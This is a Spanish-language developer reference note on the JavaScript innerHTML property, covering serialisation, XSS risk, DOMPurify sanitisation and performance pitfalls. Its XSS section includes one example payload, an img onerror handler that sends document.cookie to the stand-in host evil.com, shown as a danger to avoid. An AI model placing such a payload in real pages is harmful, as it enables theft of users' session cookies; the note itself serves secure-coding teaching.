---
title: innerHTML — Leer y escribir HTML interno (riesgo XSS)
aliases:
  - innerHTML
  - Element.innerHTML
  - XSS innerHTML
tags:
  - javascript
  - api/metodo
  - dom
objeto: Element
tipo: metodo
retorna: string
muta: true
asincrono: false
draft: false
order: 2
---

# innerHTML

> [!definicion]
> `elemento.innerHTML` lee el subárbol DOM del elemento serializado como string HTML. Al escribir, el motor parsea el string como HTML y reemplaza todos los hijos del elemento con los nodos resultantes. No escapa caracteres HTML — si el string contiene datos del usuario sin sanitizar, puede ejecutar código malicioso (XSS).

```js
const div = document.querySelector("#app");

// Leer — serializa el subárbol a string
console.log(div.innerHTML);
// → '<p class="msg">Hola <strong>mundo</strong></p>'

// Escribir — parsea el string y crea nodos DOM
div.innerHTML = '<ul><li>Item 1</li><li>Item 2</li></ul>';
```

## Riesgo XSS

Si el HTML proviene de una fuente externa (input del usuario, URL, API no confiable), asignar directamente es un vector de ataque:

```js
// PELIGROSO — el atacante puede inyectar handlers de eventos
const nombre = '<img src=x onerror="fetch(`https://evil.com?c=`+document.cookie)">';
el.innerHTML = nombre; // ejecuta el onerror

// SEGURO para texto plano — escapa los caracteres HTML
el.textContent = nombre; // muestra el string literal, no lo parsea
```

> [!warning]
> Los elementos `<script>` insertados con `innerHTML` **no se ejecutan** — el parser los ignora. Sin embargo, atributos de eventos inline (`onerror`, `onclick`, `onload` en `<img>`, `<svg>`, `<iframe>`) sí se ejecutan. La ausencia de ejecución de `<script>` no convierte a `innerHTML` en seguro.

## Sanitización con DOMPurify

Cuando es necesario renderizar HTML proveniente de fuentes externas, sanitizar antes de asignar:

```js
import DOMPurify from "dompurify";

const htmlSucio = await obtenerHTMLDeAPI();
el.innerHTML = DOMPurify.sanitize(htmlSucio);
// DOMPurify elimina atributos de eventos, iframes, scripts, etc.
```

## Vaciar un elemento

`innerHTML = ""` es la forma más común de vaciar un elemento. Para elementos con muchos hijos o listeners adjuntos, existen alternativas más eficientes:

```js
// Forma 1 — simple y directa
el.innerHTML = "";

// Forma 2 — más eficiente con muchos hijos (no activa el parser)
el.replaceChildren();

// Forma 3 — manual, útil cuando se necesita control por nodo
while (el.firstChild) el.removeChild(el.firstChild);
```

## innerHTML += (trampa de rendimiento)

El operador `+=` lee el HTML actual, lo concatena con el nuevo string y reasigna todo. Esto destruye y recrea todos los nodos hijos, perdiendo cualquier event listener adjunto:

```js
// MAL — destruye todos los hijos y sus listeners en cada iteración
items.forEach(item => {
  lista.innerHTML += `<li>${item}</li>`;
});

// BIEN — insertar sin destruir lo existente
items.forEach(item => {
  lista.insertAdjacentHTML("beforeend", `<li>${item}</li>`);
});
```

## Cómo funciona por dentro

Al leer, el motor serializa el subárbol DOM siguiendo el algoritmo de serialización HTML5 (similar a `XMLSerializer` pero para HTML). Al escribir, activa el parser HTML completo en modo "fragment parsing", que convierte el string en un `DocumentFragment` y reemplaza los hijos del elemento con ese fragmento. A diferencia de `document.write`, los `<script>` creados con `innerHTML` no se ejecutan por especificación.

> [!info]
> `innerHTML` en un elemento vacío devuelve `""`, no `null`. En un elemento con texto, devuelve el texto sin escapar — `<p>2 &lt; 3</p>` serializa los nodos de texto correctamente.

## Notas relacionadas

- [[01 textContent]]
- [[05 insertAdjacentHTML]]
- [[03 Modificar Contenido/index | Modificar Contenido]]
